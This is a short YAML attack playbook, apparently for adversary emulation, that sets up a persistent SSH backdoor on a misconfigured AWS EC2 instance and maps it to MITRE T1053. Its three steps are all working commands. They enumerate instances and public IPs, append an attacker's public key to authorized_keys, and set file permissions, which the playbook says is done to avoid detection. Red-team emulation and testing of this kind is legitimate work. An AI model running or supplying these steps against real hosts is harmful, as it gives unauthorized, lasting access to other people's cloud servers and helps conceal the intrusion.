name: Persistent SSH Backdoor on EC2
description: Establishes persistent SSH access on a misconfigured EC2 instance.
mitre_technique: T1053
stage: Persistence
steps:
  - action: aws ec2 describe-instances --query 'Reservations[*].Instances[*].{ID:InstanceId,State:State.Name,IP:PublicIpAddress}'
    description: Enumerate EC2 instances and gather IPs
  - action: ssh ec2-user@${public_ip} "echo '${ssh_public_key}' >> ~/.ssh/authorized_keys"
    description: Inject attacker's public key into authorized_keys for persistence
  - action: ssh ec2-user@${public_ip} "chmod 600 ~/.ssh/authorized_keys"
    description: Set proper permissions to avoid detection
